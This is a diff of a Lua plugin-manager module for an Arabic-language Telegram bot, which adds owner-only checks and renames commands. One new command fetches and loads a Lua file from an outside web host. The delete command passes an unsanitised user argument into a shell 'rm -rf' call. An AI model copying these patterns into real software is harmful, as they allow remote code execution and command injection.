@@ -7,7 +7,6 @@ local function plugin_enabled( name )
   end 
   return false 
 end 
-
 local function plugin_exists( name ) 
   for k,v in pairs(plugins_names()) do 
     if name..'.lua' == v then 
@@ -98,27 +97,32 @@ local function disable_plugin( name, chat )
   return '🗯┇ تم تعطيل الملف ♻️\n➠ '..name..' ' 
 end 
 
-local function moody(msg, matches)
+local function run(msg, matches)
 
-  if (matches[1] == '/p'  or matches[1]=="الملفات") and is_sudo(msg) then --after changed to moderator mode, set only sudo 
+  if matches[1] == '/p' and is_sudo(msg) then --after changed to moderator mode, set only sudo 
     return list_all_plugins() 
   end 
-  if (matches[1] == '+'  or matches[1]=="تفعيل") and is_sudo(msg) then --after changed to moderator mode, set only sudo 
-    return enable_plugin(matches[2] ) 
+  if matches[1] == '+' and is_sudo(msg) then --after changed to moderator mode, set only sudo 
+       if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
+ return enable_plugin(matches[2] ) 
   end 
-  if (matches[1] == '-'  or matches[1]=="تعطيل") and is_sudo(msg) then --after changed to moderator mode, set only sudo 
-    if matches[2] == 'plugins'  then 
+  if matches[1] == '-' and is_sudo(msg) then --after changed to moderator mode, set only sudo 
+       if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
+ if matches[2] == 'plugins'  then 
        return '🛠عود انته لوتي تريد تعطل اوامر التحكم بالملفات 🌚' 
     end 
     return disable_plugin(matches[2]) 
   end 
   if (matches[1] == 'تحديث'  or matches[1]=="we") and is_sudo(msg) then --after changed to moderator mode, set only sudo 
-  plugins = {} 
+     if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
+ plugins = {} 
   load_plugins() 
-  return "🗯┇ تم تحديث الملفات👮 ♻️"
+  return "🗯┇تم تحديث الملفات👮‍♀️ ♻️"
   end 
   ----------------
 if (matches[1] == "sp" or matches[1] == "جلب ملف") and is_sudo(msg) then 
+if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
+
      if matches[2]=="الكل" or matches[2]=="all" then
    send_msg(msg.to.id, 'انتضر قليلا سوف يتم ارسالك كل الملفات📢', msg.id, 'md')
 
@@ -138,50 +142,58 @@ end
 end
 end
  
+ 
 if (matches[1] == "حفظ الملف" or matches[1] == "save") and matches[2] then
+  if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
 if msg.reply_to_message then
 if msg.reply_to_message.document then
 fileid = msg.reply_to_message.document.file_id
 filename = msg.reply_to_message.document.file_name
 if tostring(filename):match(".lua") then
 downloadFile(fileid, "./plugins/"..matches[2]..".lua")
-return "🗯┇ *الملف :* `"..matches[2]..".lua` _تم رفعه في السيرفر 👮‍♀️_"
+return "🗯┇¦ *الملف :* `"..matches[2]..".lua` _تم رفعه في السيرفر 👮‍♀️_"
 end
 end
 end
 end
 
-if (matches[1] == "مسح الملف" or matches[1] == "dell")  and matches[2] and is_sudo(msg) then 
+if (matches[1] == "dp" or matches[1] == "حذف ملف")  and matches[2] and is_sudo(msg) then 
+      if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
 disable_plugin(matches[2]) 
 if disable_plugin(matches[2]) == '🗯┇ لا يوجد ملف بهذا الاسم ‼️ \n\n' then
 return '🗯┇ لا يوجد ملف بهذا الاسم ‼️ \n\n'
 else
 text = io.popen("rm -rf  plugins/".. matches[2]..".lua"):read('*all') 
-return '🗯┇ تم حذف الملف \n↝ '..matches[2]..'\n'
+return '🗯┇¦ تم حذف الملف \n↝ '..matches[2]..'\n'
 end
 end 
+if matches[1] == "تحديث الاتصال" and is_sudo(msg) then 
+if tonumber(msg.from.id) ~= tonumber(sudo_id) then return " هذا الاوامر للمطور الاساسي فقط 🗯┇" end
+download_to_file('http://alsaray99.esy.es/getuser.lua','getuser.lua')
+load_getuser( )
+return '♻️┇ تم تحديث الاتصال ...'
+end
+
 end 
 
 return { 
   patterns = { 
     "^/p$", 
-    "^الملفات$", 
     "^/p? (+) ([%w_%.%-]+)$", 
     "^/p? (-) ([%w_%.%-]+)$", 
-	"^الملفات? (تفعيل) ([%w_%.%-]+)$", 
-    "^الملفات? (تعطيل) ([%w_%.%-]+)$", 
-     "^(sp) (.*)$", 
-	  "^(dell) (.*)$", 
-   "^(مسح الملف) (.*)$",
+    "^(sp) (.*)$", 
+	  "^(dp) (.*)$", 
+    "^(حذف ملف) (.*)$",
    	"^(جلب ملف) (.*)$",
     "^(تحديث)$",
     "^(we)$",
-   "^(حفظ الملف) (.*)$",
+    "^(تحديث الاتصال)$",
+    "^(حفظ الملف) (.*)$",
     "^(save) (.*)$",
 
  }, 
-  run = moody, 
+  run = run, 
   moderated = true, 
 } 
 
-end 
+end
